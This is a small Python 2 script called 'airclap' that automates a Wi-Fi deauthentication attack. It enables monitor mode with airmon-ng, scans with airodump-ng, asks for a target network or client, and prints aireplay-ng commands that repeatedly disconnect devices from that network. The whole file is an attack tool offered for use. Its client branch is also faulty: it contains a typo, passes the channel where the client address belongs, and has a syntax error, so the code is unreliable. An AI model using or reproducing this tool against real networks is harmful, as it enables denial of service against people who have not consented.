import os
print ("airclap, Created by Josiah Crofton, All Rights Reserved!")
os.system("git pull")
print ("if you want to exit the program just press CTRL and c to stop")
print ("when running airodump-ng just press ctrl c to stop")
os.system("airmon-ng start wlan0")
os.system("airodump-ng wlan0mon")
x = raw_input("enter the bssid that you want to CLAP!:")
e = raw_input("enter the channel of the network you wanna CLAP!:")
aireplay = raw_input("do you want to clap the entire network or just a client? Network/Client")
if aireplay == 'Network':
  command = "aireplay-ng -0 0 -a %s wlan0mon"
  print ("copy the command below and paste it in the terminal")
  print(command % x)
else:
  aireplay_client = raw_input("enter the client you wanna CLAP:")
  client_command = "aireplay-ng - 0 -a %s -c %s wlan0mon"
  print ("copy the command below and paste it in the terminal")
  print(client_command % x, % e)
print ("AirClap, Created by Josiah Crofton, All Rights Reserved!")
